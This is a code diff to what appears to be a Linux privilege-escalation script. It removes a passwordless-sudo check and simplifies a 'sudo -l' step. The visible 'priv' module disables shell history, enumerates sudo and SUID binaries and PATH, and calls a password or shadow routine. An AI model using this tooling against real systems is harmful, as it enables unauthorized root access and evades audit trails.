@@ -260,30 +260,11 @@ def disable_hist():
    os.system("history -w 2>/dev/null")
 
 
-# check if user needs password to run sudo
-def pass_check():
-   # check to see if user needs password to run sudo
-   os.system("timeout -k 5 5 sudo -l")
-   os.system("echo $? > /tmp/time.txt")
-   with open("/tmp/time.txt") as sc:
-      ss = sc.readlines()
-      s = ss[0].strip()
-      if s == "0":
-         sudo_no_pass = True
-         print("\n-+- password not needed to run sudo commands -+-")
-      else:   
-         sudo_no_pass = False
-   return sudo_no_pass
-
-
 # check for binaries that can be run as sudo and print privesc script to screen
-def sudo_l(check):
-   if check:
-      os.system("sudo -l >> /tmp/sudo_l.txt")
-   else:
-      os.system("echo 'sudo -l' >> /tmp/sudo_l.txt")
-      print("\n###--- please run 'sudo -l >> /tmp/sudo_l.txt' then rerun this script to find sudoable commands ---###")
-      time.sleep(5)
+def sudo_l():
+   os.system("echo 'sudo -l' >> /tmp/sudo_l.txt")
+   print("\n###--- please run 'sudo -l >> /tmp/sudo_l.txt' then rerun this script to find sudoable commands ---###")
+   time.sleep(5)
    print("\n### finding binaries you can run as sudo... ###")
 
    # commands that will be printed to screen bc they require user interation 
@@ -874,8 +855,7 @@ if module == "enum":
 elif module == "priv":
    # call privilege escalation functions
    disable_hist()
-   check = pass_check()
-   sudo_l(check)
+   sudo_l()
    suid()
    path()
    pass_shadow(username,password)
